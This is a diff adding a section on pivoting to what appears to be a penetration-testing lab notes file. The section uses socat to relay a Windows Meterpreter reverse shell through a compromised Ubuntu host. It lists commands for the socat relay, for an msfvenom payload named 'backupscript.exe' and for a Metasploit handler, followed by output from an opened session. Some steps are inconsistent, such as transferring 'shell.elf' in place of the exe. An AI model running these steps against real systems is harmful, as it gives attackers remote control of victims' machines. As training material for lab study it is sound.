@@ -1294,8 +1294,74 @@ Once accepted, you will gain full RDP access to the internal host.
 <details>
 <summary><h1>Socat redirection with a Reverse Shell</h1></summary>
 
-```mermaid
+Socat is a bidirectional relay tool that creates pipe sockets between two independent network channels without using SSH tunneling. It functions as a redirector that listens on one host and port and forwards data to another IP address and port.
 
+Metasploit's listener can be started on the attack host using the following command.
+
+```bash
+socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+```
+
+Socat listens on localhost:8080 and forwards all traffic to port 80 on the attack host (10.10.14.18). After configuring the redirector, a payload can be created to connect back to the redirector running on the Ubuntu server.
+
+A listener must also be started on the attack host because any connection received by socat from a target will be redirected to the attack host's listener, where a shell will be obtained.
+
+**Creating the Windows Payload**
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+```
+```bash
+# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+# [-] No arch selected, selecting arch: x64 from the payload
+# No encoder specified, outputting raw payload
+# Payload size: 743 bytes
+# Final size of exe file: 7168 bytes
+# Saved as: backupscript.exe
+```
+
+Now, we must transfer this payload to the Windows host.
+
+```bash
+scp shell.elf ubuntu@10.129.202.64:/home/ubuntu/
+```
+```bash
+# [-]
+```
+
+**Starting MSF Console**
+
+```bash
+sudo msfconsole
+```
+
+**Configuring & Starting the multi/handler**
+
+```bash
+use exploit/multi/handler
+# [*] Using configured payload generic/shell_reverse_tcp
+set payload windows/x64/meterpreter/reverse_https
+# payload => windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+# lhost => 0.0.0.0
+set lport 80
+# lport => 80
+run
+# [*] Started HTTPS reverse handler on https://0.0.0.0:80
+```
+
+We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.
+
+**Establishing the Meterpreter Session**
+
+```bash
+# [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
+# [*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
+# [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
+# [*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500
+
+meterpreter > getuid
+# Server username: INLANEFREIGHT\victor
 ```
 
 </details>
